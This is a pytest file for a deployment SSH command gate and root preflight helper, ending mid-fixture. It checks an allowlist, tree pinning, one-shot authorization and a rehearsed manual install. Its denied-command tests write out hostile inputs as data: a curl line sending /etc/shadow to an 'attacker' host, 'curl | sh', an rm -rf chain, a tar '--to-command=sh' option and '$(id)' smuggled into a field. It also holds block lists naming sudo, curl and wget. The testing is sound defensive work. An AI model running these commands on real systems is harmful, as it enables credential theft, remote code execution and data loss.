"""Exact-byte tests for the BEAAA-23703 d9 one-shot host-gate candidate.

Run from the candidate directory:

    D9_REPO=<clone holding d9> python3 -m pytest -q tests/test_d9_host_gate.py

The tests load the candidate files themselves, not a copy. Nothing here
installs, arms, or deploys anything: every filesystem effect stays inside
pytest's temporary directories. This candidate ships no installer; the manual
procedure in INSTALL.md is extracted from the document and rehearsed against a
fake host root with `chown` and `visudo` stubbed, never against `/`.
"""

import hashlib
import importlib.machinery
import importlib.util
import json
import os
import pathlib
import re
import stat
import subprocess

import pytest

CANDIDATE = pathlib.Path(__file__).resolve().parent.parent
BUNDLE = CANDIDATE.parent
_PARENTS = pathlib.Path(__file__).resolve().parents
_ENV_REPO = os.environ.get("D9_REPO")
REPO = pathlib.Path(_ENV_REPO) if _ENV_REPO else (_PARENTS[4] if len(_PARENTS) > 4 else _PARENTS[-1])

D9 = "d9d680f53db7de263f026be5284c97229126872c"
D9_TREE = "da7883541fa77ec9712a07c5d4683bcd054c1e91"
A68 = "a68e7e0969b45e7eb8add18ff2007a305a0156aa"
CANONICAL_PREFLIGHT = "e1d50aec40829636e2ab68488c8887d1bd0e796c8aef9b62f2b66a07445f1542"
CANONICAL_GATE = "44ff5dfa0faac3174bc97b0546a51194a16ce2fac40ac15f9da984460d5d323f"


def _load(name, filename):
    loader = importlib.machinery.SourceFileLoader(name, str(CANDIDATE / filename))
    spec = importlib.util.spec_from_loader(name, loader)
    module = importlib.util.module_from_spec(spec)
    loader.exec_module(module)
    return module


gate = _load("d9_gate", "backbond-real-agent-demo-ssh-gate")
helper = _load("d9_preflight", "backbond-real-agent-demo-secret-preflight")
verifier = _load("d9_verifier", "verify_release_manifest.py")

GATE_SOURCE = (CANDIDATE / "backbond-real-agent-demo-ssh-gate").read_bytes()
HELPER_SOURCE = (CANDIDATE / "backbond-real-agent-demo-secret-preflight").read_bytes()
INSTALL_DOC = (CANDIDATE / "INSTALL.md").read_text()
MANIFEST = json.loads((CANDIDATE / "MANIFEST.json").read_text())

A68_SUDOERS = "/etc/sudoers.d/backbond-real-agent-demo"
A68_DEPLOY = "/usr/local/sbin/backbond-real-agent-demo-deploy"
TARGET_PREFLIGHT = "/usr/local/sbin/backbond-real-agent-demo-secret-preflight"
TARGET_SSHGATE = "/usr/local/sbin/backbond-real-agent-demo-ssh-gate"
KEEP_SUDOERS = "/etc/sudoers.d/backbond-real-agent-demo-secret-preflight"

ROOT = gate.RELEASE_DIR
DEPLOY_OK = (
    "DEMO_GIT_SHA='%s' DEMO_DEPLOYED_AT='2026-08-16T15:04:05Z' "
    "bash '%s/demo-real-agent/deploy.sh' '%s'" % (D9, ROOT, ROOT)
)

GOOD_ENV = (
    "DEMO_ACCESS_TOKEN=redacted-value\n"
    "ARE_BUNDLE_SIGNING_KEY=redacted-value\n"
    "OPENROUTER_API_KEY=redacted-value\n"
)


# ---------------------------------------------------------------------------
# exactly one root action
# ---------------------------------------------------------------------------


def test_manifest_declares_exactly_one_root_action():
    assert MANIFEST["root_actions"]["count"] == 1
    assert MANIFEST["root_actions"]["command"] == (
        "/usr/local/sbin/backbond-real-agent-demo-secret-preflight"
    )
    assert MANIFEST["root_actions"]["arguments"] == "none"


def gate_code_without_docstring():
    """The gate source with its module docstring removed."""
    body = GATE_SOURCE.split(b'"""', 2)
    assert len(body) == 3, "module docstring not found"
    return body[2]


def test_gate_never_elevates():
    """The gate's code must contain no sudo call and no second privileged path."""
    code = gate_code_without_docstring()
    for forbidden in (b"sudo", b"backbond-real-agent-demo-authorize", b"pkexec", b"setuid"):
        assert forbidden not in code


def test_candidate_ships_no_second_helper_and_no_sudoers_file():
    names = {path.name for path in CANDIDATE.iterdir()}
    assert "backbond-real-agent-demo-authorize" not in names
    assert not any(name.endswith(".sudoers") for name in names)
    assert not any(name.startswith("sudoers-") for name in names)
    installed = {entry["target"] for entry in MANIFEST["install"]}
    assert installed == {
        "/usr/local/sbin/backbond-real-agent-demo-ssh-gate",
        "/usr/local/sbin/backbond-real-agent-demo-secret-preflight",
    }
    assert not any("sudoers.d" in target for target in installed)


def test_existing_sudoers_rule_is_pinned_unchanged():
    unchanged = {entry["path"]: entry["sha256"] for entry in MANIFEST["must_not_change"]}
    assert "/etc/sudoers.d/backbond-real-agent-demo-secret-preflight" in unchanged


# ---------------------------------------------------------------------------
# allowlist
# ---------------------------------------------------------------------------


def test_release_directory_is_pinned_to_d9():
    assert ROOT == "/opt/backbond-real-agent-demo/releases/" + D9
    assert gate.SHA == D9


def test_exact_mkdir_is_permitted():
    assert gate.resolve("mkdir -p " + ROOT) == ("mkdir", None)


def test_exact_extract_is_permitted():
    assert gate.resolve("cd %s && tar -xzf real-agent-demo-release.tgz" % ROOT) == ("extract", None)


def test_exact_deploy_is_permitted():
    assert gate.resolve(DEPLOY_OK) == ("deploy", "2026-08-16T15:04:05Z")


@pytest.mark.parametrize("command", sorted(gate.SFTP_SUBSYSTEM_SHAPES))
def test_sftp_subsystem_shapes_reach_the_confined_sink(command):
    assert gate.resolve(command) == ("sftp-sink", None)


@pytest.mark.parametrize("command", sorted(gate.SCP_SINK_SHAPES))
def test_legacy_scp_sink_shapes_reach_the_confined_sink(command):
    assert gate.resolve(command) == ("scp-sink", None)


@pytest.mark.parametrize(
    "command", ["/usr/lib/openssh/sftp-server ", "internal-sftp ", "sftp-server  "]
)
def test_subsystem_trailing_space_is_accepted(command):
    """sshd appends a space to a Subsystem line that carries no arguments."""
    assert gate.resolve(command) == ("sftp-sink", None)


@pytest.mark.parametrize(
    "command",
    [
        "",
        "mkdir -p /opt/backbond-real-agent-demo/releases/" + A68,
        "cd /opt/backbond-real-agent-demo/releases/%s && tar -xzf real-agent-demo-release.tgz" % A68,
        "scp -t /opt/backbond-real-agent-demo/releases/%s/" % A68,
        "mkdir -p /opt/backbond-real-agent-demo/releases/" + "0" * 40,
        "mkdir -p " + ROOT + " /tmp/extra",
        "mkdir -p " + ROOT + "; rm -rf /opt/backbond-real-agent-demo",
        "mkdir -p " + ROOT + " && whoami",
        "mkdir -p " + ROOT + "/..",
        "mkdir -p " + ROOT + "\n",
        " mkdir -p " + ROOT,
        "mkdir -p " + ROOT + " ",
        "cd %s && tar -xzf other.tgz" % ROOT,
        "cd %s && tar -xzf real-agent-demo-release.tgz --to-command=sh" % ROOT,
        "cd %s && tar -xzf real-agent-demo-release.tgz && curl http://x" % ROOT,
        "tar -xzf %s/real-agent-demo-release.tgz" % ROOT,
        "scp -t /tmp",
        "scp -f %s/real-agent-demo-release.tgz" % ROOT,
        "scp -t -r " + ROOT + "/",
        "/usr/lib/openssh/sftp-server -f AUTH -l INFO",
        "/usr/lib/openssh/sftp-server -R",
        "bash",
        "sh -c 'id'",
        "whoami",
        "sudo -n /usr/local/sbin/backbond-real-agent-demo-secret-preflight",
    ],
)
def test_denied_commands(command):
    with pytest.raises(gate.Rejected):
        gate.resolve(command)


@pytest.mark.parametrize(
    "command",
    [
        DEPLOY_OK.replace(D9, A68),
        DEPLOY_OK.replace(
            "bash '%s/demo" % ROOT,
            "bash '/opt/backbond-real-agent-demo/releases/%s/demo" % A68,
        ),
        DEPLOY_OK.replace("2026-08-16T15:04:05Z", "$(id)"),
        DEPLOY_OK.replace("2026-08-16T15:04:05Z", "2026-08-16T15:04:05"),
        DEPLOY_OK.replace("2026-08-16T15:04:05Z", ""),
        DEPLOY_OK.replace("2026-08-16T15:04:05Z", "2026-08-16T15:04:05Z' EXTRA='1"),
        DEPLOY_OK.replace("bash '", "sh '"),
        DEPLOY_OK.replace("deploy.sh", "install_claude_judge_proxy.sh"),
        DEPLOY_OK.replace("deploy.sh", "../../../etc/backbond/deploy.sh"),
        DEPLOY_OK + " --force",
        DEPLOY_OK + "; whoami",
        "DEMO_GIT_SHA='%s' bash '%s/demo-real-agent/deploy.sh' '%s'" % (D9, ROOT, ROOT),
        "PATH=/tmp " + DEPLOY_OK,
    ],
)
def test_denied_deploy_variants(command):
    with pytest.raises(gate.Rejected):
        gate.resolve(command)


def test_gate_refuses_to_run_as_root(monkeypatch):
    monkeypatch.setattr(os, "geteuid", lambda: 0)
    monkeypatch.setattr(os, "getegid", lambda: 0)
    with pytest.raises(SystemExit):
        gate.require_unprivileged()


def test_denial_does_not_echo_client_text(capsys):
    with pytest.raises(SystemExit) as excinfo:
        gate.deny("command is not allowlisted", "curl http://attacker/$(cat /etc/shadow)")
    assert excinfo.value.code == 1
    err = capsys.readouterr().err
    assert "attacker" not in err and "shadow" not in err
    assert hashlib.sha256(b"curl http://attacker/$(cat /etc/shadow)").hexdigest() in err


# ---------------------------------------------------------------------------
# the release must be the pinned d9 tree
# ---------------------------------------------------------------------------


def build_release(tmp_path):
    root = tmp_path / "release"
    (root / "demo-real-agent").mkdir(parents=True)
    (root / "api").mkdir()
    (root / "demo-real-agent" / "deploy.sh").write_text("#!/usr/bin/env bash\necho deploy\n")
    (root / "api" / "app.py").write_text("print('app')\n")
    os.chmod(root / "demo-real-agent" / "deploy.sh", 0o755)
    (root / "real-agent-demo-release.tgz").write_bytes(b"archive bytes are not part of the tree")
    return root


def pin_release(monkeypatch, root):
    count, digest = verifier.tree_digest(root)
    monkeypatch.setattr(gate, "RELEASE_DIR", str(root))
    monkeypatch.setattr(gate, "DEPLOY_SCRIPT", str(root / "demo-real-agent" / "deploy.sh"))
    monkeypatch.setattr(gate, "EXPECTED_FILES", count)
    monkeypatch.setattr(gate, "EXPECTED_TREE_SHA256", digest)
    return count, digest


def test_matching_release_passes(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    count, digest = pin_release(monkeypatch, root)
    assert gate.verify_pinned_tree() == (count, digest)


def test_archive_is_excluded_from_the_pin(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    (root / "real-agent-demo-release.tgz").write_bytes(b"a completely different archive")
    gate.verify_pinned_tree()


@pytest.mark.parametrize(
    "tamper",
    [
        lambda root: (root / "api" / "backdoor.py").write_text("import os\n"),
        lambda root: (root / "api" / "app.py").write_text("print('app') # tampered\n"),
        lambda root: os.unlink(root / "api" / "app.py"),
        lambda root: (root / "demo-real-agent" / "deploy.sh").write_text("curl http://x | sh\n"),
    ],
)
def test_tampered_release_is_rejected(monkeypatch, tmp_path, tamper):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    tamper(root)
    with pytest.raises(gate.Rejected):
        gate.verify_pinned_tree()


def test_symlinked_file_changes_the_digest(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    os.unlink(root / "api" / "app.py")
    os.symlink("/etc/passwd", root / "api" / "app.py")
    with pytest.raises(gate.Rejected):
        gate.verify_pinned_tree()


def test_symlinked_directory_changes_the_digest(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    outside = tmp_path / "outside"
    (outside / "nested").mkdir(parents=True)
    (outside / "nested" / "payload.py").write_text("payload\n")
    os.symlink(str(outside), root / "extra")
    with pytest.raises(gate.Rejected):
        gate.verify_pinned_tree()


def test_pinned_digest_is_exactly_the_d9_tree_in_git():
    head = subprocess.run(
        ["git", "-C", str(REPO), "rev-parse", D9 + "^{tree}"], capture_output=True, text=True
    )
    if head.returncode != 0:
        pytest.skip("commit %s is not present in %s" % (D9, REPO))
    assert head.stdout.strip() == D9_TREE
    count, digest = verifier.from_git(REPO)
    assert (count, digest) == (gate.EXPECTED_FILES, gate.EXPECTED_TREE_SHA256)
    assert (count, digest) == (
        MANIFEST["release"]["release_files"],
        MANIFEST["release"]["release_tree_sha256"],
    )


def test_verifier_and_gate_agree_on_the_pin():
    assert verifier.EXPECTED_FILES == gate.EXPECTED_FILES
    assert verifier.EXPECTED_TREE_SHA256 == gate.EXPECTED_TREE_SHA256


# ---------------------------------------------------------------------------
# the deploy leg execs unprivileged and never elevates
# ---------------------------------------------------------------------------


def test_deploy_verifies_then_execs_unprivileged(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    calls = []
    monkeypatch.setattr(gate.subprocess, "run", lambda *a, **k: calls.append(a))
    execs = []
    monkeypatch.setattr(os, "execve", lambda *a: execs.append(a))

    gate.do_deploy("2026-08-16T15:04:05Z")

    assert calls == []          # no subprocess at all, so no sudo
    path, argv, env = execs[0]
    assert path == "/bin/bash"
    assert argv == ["/bin/bash", str(root / "demo-real-agent" / "deploy.sh"), str(root)]
    assert env["DEMO_GIT_SHA"] == D9
    assert env["DEMO_DEPLOYED_AT"] == "2026-08-16T15:04:05Z"
    assert set(env) == {"PATH", "HOME", "USER", "LOGNAME", "DEMO_GIT_SHA", "DEMO_DEPLOYED_AT"}
    assert env["PATH"] == "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"


def test_a_tampered_release_never_reaches_exec(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    (root / "api" / "backdoor.py").write_text("import os\n")
    execs = []
    monkeypatch.setattr(os, "execve", lambda *a: execs.append(a))
    with pytest.raises(gate.Rejected):
        gate.do_deploy("2026-08-16T15:04:05Z")
    assert execs == []


def test_absent_deploy_script_is_rejected(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    os.unlink(root / "demo-real-agent" / "deploy.sh")
    with pytest.raises(gate.Rejected):
        gate.do_deploy("2026-08-16T15:04:05Z")


def test_symlinked_deploy_script_is_rejected(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    script = root / "demo-real-agent" / "deploy.sh"
    os.unlink(script)
    os.symlink("/bin/sh", script)
    with pytest.raises(gate.Rejected):
        gate.do_deploy("2026-08-16T15:04:05Z")


# ---------------------------------------------------------------------------
# the single root helper: unchanged preflight, plus one-shot consumption
# ---------------------------------------------------------------------------


def test_preflight_logic_is_byte_identical_to_canonical_d9():
    """Only the docstring differs; every canonical code path is untouched."""
    canonical = subprocess.run(
        ["git", "-C", str(REPO), "cat-file", "blob",
         D9 + ":demo-real-agent/host/real_agent_demo_secret_preflight.py"],
        capture_output=True,
    )
    if canonical.returncode != 0:
        pytest.skip("commit %s is not present in %s" % (D9, REPO))
    assert hashlib.sha256(canonical.stdout).hexdigest() == CANONICAL_PREFLIGHT
    original = canonical.stdout.decode().splitlines()
    enhanced = HELPER_SOURCE.decode().splitlines()
    removed = [line for line in original if line not in enhanced]
    assert removed == ['"""Validate the fixed passive-demo secret file without disclosing values."""']


@pytest.fixture
def env_file(tmp_path, monkeypatch):
    path = tmp_path / "real-agent-demo.env"
    path.write_text(GOOD_ENV)
    os.chmod(path, 0o600)
    monkeypatch.setattr(helper, "EXPECTED_UID", os.getuid())
    monkeypatch.setattr(helper, "EXPECTED_GID", os.getgid())
    return path


@pytest.fixture
def armed(tmp_path, monkeypatch):
    state = tmp_path / "backbond"
    state.mkdir(mode=0o700)
    allow = state / "real-agent-demo-deploy.allow"
    allow.write_text(D9 + "\n")
    os.chmod(allow, 0o600)
    monkeypatch.setattr(helper, "AUTH_UID", os.getuid())
    monkeypatch.setattr(helper, "AUTH_GID", os.getgid())
    monkeypatch.setattr(os, "geteuid", lambda: 0)
    return state, allow, state / "real-agent-demo-deploy.consumed"


def consume(state, allow, consumed):
    return helper.consume_authorization(state, allow, consumed)


def test_names_only_preflight_still_reports_configured_names(env_file):
    assert helper.validate(env_file) == [
        "DEMO_ACCESS_TOKEN", "ARE_BUNDLE_SIGNING_KEY", "OPENROUTER_API_KEY"
    ]


def test_preflight_reports_the_judge_proxy_line_deploy_sh_greps_for(env_file):
    env_file.write_text(
        "DEMO_ACCESS_TOKEN=v\nARE_BUNDLE_SIGNING_KEY=v\n"
        "DEMO_JUDGE_BACKEND=claude-code-proxy\nCLAUDE_JUDGE_PROXY_TOKEN=v\n"
    )
    os.chmod(env_file, 0o600)
    assert "DEMO_JUDGE_BACKEND" in helper.validate(env_file)


def test_preflight_never_returns_a_value(env_file):
    for name in helper.validate(env_file):
        assert "redacted-value" not in name


@pytest.mark.parametrize(
    "content,reason",
    [
        ("ARE_BUNDLE_SIGNING_KEY=v\n", "DEMO_ACCESS_TOKEN: missing_or_empty"),
        ("DEMO_ACCESS_TOKEN=v\n", "ARE_BUNDLE_SIGNING_KEY: missing_or_empty"),
        ("DEMO_ACCESS_TOKEN=v\nARE_BUNDLE_SIGNING_KEY=v\n", "judge_configuration: missing_or_invalid"),
    ],
)
def test_preflight_failures_are_unchanged(env_file, content, reason):
    env_file.write_text(content)
    os.chmod(env_file, 0o600)
    with pytest.raises(helper.PreflightError) as excinfo:
        helper.validate(env_file)
    assert excinfo.value.args[0] == reason


def test_authorization_is_consumed_exactly_once(armed):
    state, allow, consumed = armed
    assert consume(state, allow, consumed) == D9
    assert not allow.exists() and consumed.exists()
    with pytest.raises(helper.PreflightError) as excinfo:
        consume(state, allow, consumed)
    assert excinfo.value.args[0] == "deploy_authorization: absent"


def test_consumption_is_a_same_directory_rename(armed):
    state, allow, consumed = armed
    assert os.path.dirname(str(helper.ALLOW_PATH)) == os.path.dirname(str(helper.CONSUMED_PATH))
    before = allow.stat().st_ino
    consume(state, allow, consumed)
    assert consumed.stat().st_ino == before


def test_wrong_release_is_refused_and_left_in_place(armed):
    state, allow, consumed = armed
    allow.write_text(A68 + "\n")
    os.chmod(allow, 0o600)
    with pytest.raises(helper.PreflightError) as excinfo:
        consume(state, allow, consumed)
    assert excinfo.value.args[0] == "deploy_authorization: wrong_release"
    assert allow.exists() and not consumed.exists()


@pytest.mark.parametrize(
    "content,reason",
    [
        ("", "wrong_release"),
        (D9[:-1] + "0\n", "wrong_release"),
        (D9.upper() + "\n", "wrong_release"),
        (D9 + " " + A68 + "\n", "wrong_release"),
        ("x" * 200, "oversized"),
    ],
)
def test_authorization_content_must_be_exactly_d9(armed, content, reason):
    state, allow, consumed = armed
    allow.write_text(content)
    os.chmod(allow, 0o600)
    with pytest.raises(helper.PreflightError) as excinfo:
        consume(state, allow, consumed)
    assert excinfo.value.args[0] == "deploy_authorization: " + reason
    assert allow.exists()


@pytest.mark.parametrize("mode", [0o644, 0o660, 0o666, 0o700])
def test_authorization_mode_must_be_0600(armed, mode):
    state, allow, consumed = armed
    os.chmod(allow, mode)
    with pytest.raises(helper.PreflightError) as excinfo:
        consume(state, allow, consumed)
    assert excinfo.value.args[0] == "deploy_authorization: wrong_mode"


def test_authorization_owner_must_be_root(armed, monkeypatch):
    state, allow, consumed = armed
    monkeypatch.setattr(helper, "AUTH_UID", os.getuid() + 1)
    with pytest.raises(helper.PreflightError) as excinfo:
        helper._read_authorization(allow)
    assert excinfo.value.args[0] == "deploy_authorization: wrong_owner"
    assert allow.exists()


def test_symlinked_authorization_is_refused(armed, tmp_path):
    state, allow, consumed = armed
    target = tmp_path / "elsewhere"
    target.write_text(D9 + "\n")
    os.chmod(target, 0o600)
    os.unlink(allow)
    os.symlink(str(target), allow)
    with pytest.raises(helper.PreflightError) as excinfo:
        consume(state, allow, consumed)
    assert excinfo.value.args[0] == "deploy_authorization: not_regular"


def test_fifo_authorization_is_refused(armed):
    state, allow, consumed = armed
    os.unlink(allow)
    os.mkfifo(allow, 0o600)
    with pytest.raises(helper.PreflightError) as excinfo:
        consume(state, allow, consumed)
    assert excinfo.value.args[0] == "deploy_authorization: not_regular"


@pytest.mark.parametrize(
    "field,reason",
    [
        ("uid", "opened_wrong_owner"),
        ("gid", "opened_wrong_owner"),
        ("mode", "opened_wrong_mode"),
        ("type", "opened_not_regular"),
        ("ino", "changed_during_check"),
    ],
)
def test_opened_descriptor_is_revalidated(armed, monkeypatch, field, reason):
    """A same-inode metadata race after the lstat must fail closed."""
    state, allow, consumed = armed
    real_fstat = os.fstat

    class Faked(object):
        def __init__(self, base):
            self._base = base

        def __getattr__(self, name):
            return getattr(self._base, name)

    def fake_fstat(fd):
        base = real_fstat(fd)
        faked = Faked(base)
        if field == "uid":
            faked.st_uid = base.st_uid + 1
        elif field == "gid":
            faked.st_gid = base.st_gid + 1
        elif field == "mode":
            faked.st_mode = stat.S_IFREG | 0o644
        elif field == "type":
            faked.st_mode = stat.S_IFIFO | 0o600
        elif field == "ino":
            faked.st_ino = base.st_ino + 1
        return faked

    monkeypatch.setattr(os, "fstat", fake_fstat)
    with pytest.raises(helper.PreflightError) as excinfo:
        consume(state, allow, consumed)
    assert excinfo.value.args[0] == "deploy_authorization: " + reason
    assert allow.exists()


def test_state_directory_must_not_be_writable(armed):
    state, allow, consumed = armed
    os.chmod(state, 0o777)
    try:
        with pytest.raises(helper.PreflightError) as excinfo:
            consume(state, allow, consumed)
        assert excinfo.value.args[0] == "deploy_authorization: state_dir_writable"
    finally:
        os.chmod(state, 0o700)


def test_helper_requires_root_to_consume(armed, monkeypatch):
    state, allow, consumed = armed
    monkeypatch.setattr(os, "geteuid", lambda: 1002)
    with pytest.raises(helper.PreflightError) as excinfo:
        consume(state, allow, consumed)
    assert excinfo.value.args[0] == "deploy_authorization: not_root"
    assert allow.exists()


def test_helper_rejects_every_argument():
    for argv in ([""], ["/etc/passwd"], [D9], ["--consume"]):
        assert helper.main(argv) == 2


def test_helper_reports_preflight_before_it_consumes(monkeypatch, capsys):
    """An unarmed verification still shows the secret boundary result."""
    monkeypatch.setattr(helper, "validate", lambda: ["DEMO_ACCESS_TOKEN"])
    monkeypatch.setattr(
        helper, "consume_authorization",
        lambda: (_ for _ in ()).throw(helper.PreflightError("deploy_authorization: absent")),
    )
    assert helper.main([]) == 1
    captured = capsys.readouterr()
    assert "secret_file: valid" in captured.out
    assert "DEMO_ACCESS_TOKEN: configured" in captured.out
    assert "deploy_authorization: absent" in captured.err


def test_helper_success_line_names_the_pinned_release(monkeypatch, capsys):
    monkeypatch.setattr(helper, "validate", lambda: ["DEMO_ACCESS_TOKEN"])
    monkeypatch.setattr(helper, "consume_authorization", lambda: D9)
    assert helper.main([]) == 0
    assert "deploy_authorization: consumed %s" % D9 in capsys.readouterr().out


# ---------------------------------------------------------------------------
# no installer ships: the procedure is manual, and it is rehearsed from the
# document itself
# ---------------------------------------------------------------------------


def extract_block(name):
    """The shell block INSTALL.md marks with BEGIN:<name> / END:<name>."""
    pattern = (
        r"<!-- BEGIN:%s -->\n```sh\n(.*?)```\n<!-- END:%s -->" % (name, name)
    )
    match = re.search(pattern, INSTALL_DOC, re.S)
    assert match, "INSTALL.md has no %s block" % name
    return match.group(1)


INSTALL_PROCEDURE = extract_block("install-procedure")
ROLLBACK_PROCEDURE = extract_block("rollback-procedure")


def test_candidate_ships_no_installer():
    """BEAAA-23726: no repository-provided program is authorized to run as root."""
    names = {path.name for path in CANDIDATE.iterdir()}
    assert "install_host_gate.py" not in names
    assert MANIFEST["procedure"]["repository_installer"] is None
    assert MANIFEST["procedure"]["type"] == "manual_root_owner"
    assert MANIFEST["procedure"]["document"] == "INSTALL.md"


def test_nothing_in_the_bundle_names_a_repository_installer():
    """CTO 48a4cb3a: the name is gone from the procedure, the contract and the report."""
    for path in (CANDIDATE / "INSTALL.md", CANDIDATE / "MANIFEST.json", BUNDLE / "REPORT.md"):
        assert "install_host_gate" not in path.read_text(), path.name
    shipped = [line.split(None, 1)[1].strip() for line in (BUNDLE / "SHA256SUMS").read_text().splitlines()]
    assert not any("install_host_gate" in name for name in shipped)


def test_only_fixed_system_programs_run_as_root():
    procedure = INSTALL_PROCEDURE + ROLLBACK_PROCEDURE
    for forbidden in ("deploy.sh", "eval ", "$(cat", "curl", "wget", "git "):
        assert forbidden not in procedure
    # the reviewed bytes are copied, never executed
    assert '"$CAND/backbond-real-agent-demo-secret-preflight"' in INSTALL_PROCEDURE
    assert re.search(r'^\s*"?\$CAND/', INSTALL_PROCEDURE, re.M) is None


# --- F5: validation leaves no cache residue --------------------------------


def test_validator_is_non_executing_and_writes_no_cache():
    validator = MANIFEST["validation"]["command"]
    assert "py_compile" not in validator
    assert "ast.parse" in validator
    assert MANIFEST["validation"]["executes_the_file"] is False
    assert MANIFEST["validation"]["writes_bytecode_cache"] is False
    for entry in MANIFEST["install"]:
        assert entry["validator"] == validator


def test_install_step_matches_the_manifest_validator_exactly():
    validator = MANIFEST["validation"]["command"]
    assert validator + ' "$TMP"' in INSTALL_PROCEDURE


def test_no_py_compile_anywhere_in_the_bundle_documents():
    for path in (CANDIDATE / "INSTALL.md", CANDIDATE / "MANIFEST.json"):
        assert "-m py_compile" not in path.read_text().replace(
            MANIFEST["validation"]["rejected"], ""
        )


def test_procedure_asserts_no_cache_residue_beside_the_helpers():
    assert "no_cache_residue" in INSTALL_PROCEDURE
    assert INSTALL_PROCEDURE.count("no_cache_residue ") >= 2
    assert "__pycache__" in INSTALL_PROCEDURE and "*.pyc" in INSTALL_PROCEDURE
    checks = [c["command"] for c in MANIFEST["post_install_verification"]]
    assert any("__pycache__" in command for command in checks)


def test_validator_writes_no_bytecode_for_a_real_helper(tmp_path):
    """Run the manifest's validator itself and prove it leaves nothing behind."""
    staged = tmp_path / ".backbond-install.rehearsal"
    staged.write_bytes(HELPER_SOURCE)
    subprocess.run(
        ["/bin/sh", "-c", MANIFEST["validation"]["command"] + ' "$1"', "sh", str(staged)],
        check=True,
    )
    assert sorted(p.name for p in tmp_path.iterdir()) == [".backbond-install.rehearsal"]


# --- F6: unique, non-overwriting backups -----------------------------------


def test_manifest_pins_a_unique_fail_if_exists_backup_directory():
    backup = MANIFEST["backup"]
    assert backup["fail_if_exists"] is True
    assert backup["reuse"] == "prohibited"
    assert backup["mode"] == "0700"
    assert backup["owner_uid"] == 0 and backup["owner_gid"] == 0
    assert backup["layout"] == "path_preserving"
    assert backup["creation"].startswith("mkdir -m 0700")
    assert "-p" not in backup["creation"].split("<")[0].split()[1:2] + []


def test_procedure_creates_the_backup_directory_without_mkdir_p():
    line = [l for l in INSTALL_PROCEDURE.splitlines() if l.startswith("mkdir -m 0700")]
    assert len(line) == 1, "exactly one backup-directory creation is expected"
    assert " -p " not in line[0]
    assert "exist_ok" not in INSTALL_PROCEDURE
    assert "|| stop" in line[0]


def test_backups_are_path_preserving_not_by_basename():
    assert 'mkdir -p "$BK$(dirname "$REL")"' in INSTALL_PROCEDURE
    assert 'cp -a "$T" "$BK$REL"' in INSTALL_PROCEDURE
    assert "$BK$REL" in INSTALL_PROCEDURE
    assert "$(basename" not in INSTALL_PROCEDURE
    assert MANIFEST["backup"]["layout"] == "path_preserving"


# --- F1: bounded rollback ---------------------------------------------------


def test_manifest_rollback_is_bounded_to_the_replacement_targets():
    rollback = MANIFEST["rollback"]
    assert rollback["bounded"] is True
    assert set(rollback["never_restores"]) == {A68_SUDOERS, A68_DEPLOY}
    assert set(rollback["asserts_absent_after"]) == {A68_SUDOERS, A68_DEPLOY}
    assert any(CANONICAL_PREFLIGHT in step for step in rollback["restores"])
    assert any(CANONICAL_GATE in step for step in rollback["restores"])
    assert len(rollback["restores"]) == 2
    for entry in MANIFEST["remove"]:
        assert entry["restored_by_rollback"] is False


def test_rollback_procedure_restores_two_targets_and_no_others():
    restored = re.search(r"for REL in (.*?)\n\s*SAVED=", ROLLBACK_PROCEDURE, re.S).group(1)
    assert TARGET_PREFLIGHT in restored
    assert TARGET_SSHGATE in restored
    assert A68_SUDOERS not in restored
    assert "backbond-real-agent-demo-deploy" not in restored


def test_rollback_procedure_stops_if_the_a68_authority_reappears():
    assert "rollback never restores it" in ROLLBACK_PROCEDURE
    assert "$VISUDO -c" in ROLLBACK_PROCEDURE


# --- F3: a failed installation stops and leaves a coherent host -------------


def test_failed_install_branch_is_explicit():
    failed = MANIFEST["failed_install"]
    assert failed["rule"] == "stop at the first non-zero exit"
    joined = " ".join(failed["steps"]).lower()
    for phrase in ("stop", "rollback", "visudo -c", "still absent", "beaaa-23705"):
        assert phrase in joined
    assert "do not arm" in joined and "do not deploy" in joined
    assert "set -eu" in INSTALL_PROCEDURE
    assert "If any step fails" in INSTALL_DOC


def test_removals_precede_replacements_so_an_abort_only_narrows():
    removal = INSTALL_PROCEDURE.index('rm -f "$A68_SUDOERS"')
    replacement = INSTALL_PROCEDURE.index('replace "$CAND/backbond-real-agent-demo-secret-preflight"')
    assert removal < replacement
    assert MANIFEST["procedure"]["order"].startswith("removals before replacements")


# --- rehearsal: run the documented procedure against a fake host root -------


SYNTHETIC_A68_SUDOERS = b"# stale a68 authority, rehearsal stand-in\npassive-demo-deploy ALL=(root) NOPASSWD: /usr/local/sbin/backbond-real-agent-demo-deploy\n"
SYNTHETIC_KEEP_SUDOERS = b"# the one rule that must not change, rehearsal stand-in\n"


def _seed(root, rel, data, mode):
    path = root / rel.lstrip("/")
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)
    os.chmod(path, mode)
    return path


def _host_bytes(path, pinned):
    """The real host file when this machine has it at the pinned digest."""
    try:
        data = pathlib.Path(path).read_bytes()
    except OSError:
        return None
    return data if hashlib.sha256(data).hexdigest() == pinned else None


@pytest.fixture
def fake_host(tmp_path):
    """A host root seeded with the exact bytes this candidate expects to replace.

    Only the two sudoers files are stand-ins: they are 0440 root-only on the
    real host and unreadable from this seat, so the rehearsal substitutes their
    two pinned digests in the procedure text. Every other constant, and both
    reviewed source digests, are used exactly as shipped.
    """
    canonical = subprocess.run(
        ["git", "-C", str(REPO), "cat-file", "blob",
         D9 + ":demo-real-agent/host/real_agent_demo_secret_preflight.py"],
        capture_output=True,
    )
    if canonical.returncode != 0:
        pytest.skip("commit %s is not present in %s" % (D9, REPO))
    assert hashlib.sha256(canonical.stdout).hexdigest() == CANONICAL_PREFLIGHT

    stale_gate = _host_bytes(TARGET_SSHGATE, CANONICAL_GATE)
    deploy_sha = "956065275defd2abcc95a7d2e14d8e70ee54c10aa799578aa00602f29c9af723"
    stale_deploy = _host_bytes(A68_DEPLOY, deploy_sha)

